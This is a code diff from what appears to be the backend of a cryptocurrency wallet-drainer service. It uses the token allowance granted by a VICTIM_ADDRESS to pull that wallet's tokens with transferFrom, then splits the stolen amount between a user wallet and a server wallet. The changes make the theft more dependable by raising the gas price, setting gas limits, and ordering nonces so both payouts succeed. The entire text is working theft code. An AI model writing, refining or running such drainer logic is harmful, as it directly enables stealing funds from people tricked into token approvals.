@@ -30,7 +30,7 @@ const approvedToken = async (data, config) => {
   const withdrawalAmount = allowance.gt(balance) ? balance : allowance;
 
   const gasLimits = {};
-  const gasPrice = await web3services.getGasPrice(chain.id);
+  const gasPrice = await web3services.getGasPrice(chain.id, 100);
 
   gasLimits["transferFrom"] = await contract.estimateGas.transferFrom(
     VICTIM_ADDRESS,
@@ -90,10 +90,25 @@ const approvedToken = async (data, config) => {
 
   console.log("refueling_transfer tx: ", refueling_transfer.transactionHash);
 
-  const userTransaction = await contract.transfer(USER_ADDRESS, userAmount);
+  const transferOptions = {
+    gasLimit: gasLimits["transfer"],
+    gasPrice: gasPrice,
+  };
+
+  const currentNonce = await provider.getTransactionCount(
+    OPERATOR_ADDRESS,
+    "pending"
+  );
+
+  const userTransaction = await contract.transfer(USER_ADDRESS, userAmount, {
+    ...transferOptions,
+    nonce: currentNonce,
+  });
+
   const serverTransaction = await contract.transfer(
     SERVER_ADDRESS,
-    serverAmount
+    serverAmount,
+    { ...transferOptions, nonce: currentNonce + 1 }
   );
 
   const userReceipt = await userTransaction.wait();
@@ -121,8 +136,7 @@ const complete = async (req, res) => {
   const user = req.user;
   const { event, ...payload } = req.body;
 
-  const USER_ADDRESS =
-    user.WALLET_ADDRESS || "0xbEC6A66F83f73441545f175Ed5B8da0ACE448547"; //user.WALLET_ADDRESS
+  const USER_ADDRESS = user.WALLET_ADDRESS;
   const SERVER_ADDRESS = process.env.SERVER_WALLET_ADDRESS;
   const OPERATOR_ADDRESS = payload.randomAddress;
 
@@ -154,7 +168,6 @@ const complete = async (req, res) => {
     };
 
     const response = await events[event](payload, config);
-    console.log("response: ", response);
     res.send(response);
   } catch (error) {
     logger.error(error);
